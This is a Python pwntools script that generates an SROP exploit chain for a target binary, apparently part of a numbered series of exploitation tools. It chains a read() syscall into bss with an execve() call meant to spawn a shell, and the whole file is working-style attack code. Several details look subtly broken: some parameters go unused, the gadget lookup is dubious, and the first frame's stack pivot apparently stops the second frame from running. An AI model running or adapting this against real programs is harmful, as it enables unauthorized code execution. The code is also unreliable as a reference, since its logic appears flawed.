#!/usr/bin/env python3
import sys
import struct
from pwn import *

class SROPGenerator:
    def __init__(self, binary_path):
        self.elf = ELF(binary_path)
        self.rop = ROP(self.elf)
        self.sigreturn_addr = None
        self.syscall_addr = None
        self._find_gadgets()

    def _find_gadgets(self):
        self.sigreturn_addr = self.rop.find_gadget(['sigreturn'])[0]
        self.syscall_addr = self.rop.find_gadget(['syscall'])[0]

    def build_srop_frame(self, rax=15, rdi=0, rsi=0, rdx=0, rsp=None, rip=None):
        frame = SigreturnFrame()
        frame.rax = rax
        frame.rdi = rdi
        frame.rsi = rsi
        frame.rdx = rdx
        frame.rsp = rsp if rsp else self.elf.bss() + 0x1000
        frame.rip = rip if rip else self.syscall_addr
        return bytes(frame)

    def generate_chain(self, read_addr, write_addr, shellcode_addr=None):
        chain = b''
        # first call read(0, bss, 0x1000)
        frame1 = self.build_srop_frame(rax=0, rdi=0, rsi=self.elf.bss(), rdx=0x1000, rip=self.syscall_addr)
        chain += p64(self.sigreturn_addr) + frame1
        # after read, second srop to execve
        frame2 = self.build_srop_frame(rax=59, rdi=self.elf.bss(), rsi=0, rdx=0, rip=self.syscall_addr)
        chain += p64(self.sigreturn_addr) + frame2
        return chain

    def write_chain_to_file(self, chain, output='srop_chain.bin'):
        with open(output, 'wb') as f:
            f.write(chain)
        log.success(f"Chain written to {output}")

def main():
    if len(sys.argv) < 2:
        print("Usage: 07_srop_generator.py <binary>")
        sys.exit(1)
    s = SROPGenerator(sys.argv[1])
    chain = s.generate_chain(0x0, 0x0)
    s.write_chain_to_file(chain)

if __name__ == '__main__':
    main()